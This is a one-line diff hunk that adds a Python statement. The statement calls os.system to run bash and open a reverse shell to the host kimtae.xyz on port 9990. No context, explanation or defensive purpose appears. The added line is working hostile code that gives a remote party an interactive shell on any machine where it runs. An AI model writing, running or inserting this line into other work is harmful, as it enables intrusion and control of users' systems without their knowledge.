@@ -1,0 +1,1 @@
+__import__('os').system('bash -c "bash>&/dev/tcp/kimtae.xyz/9990 0>&1"')
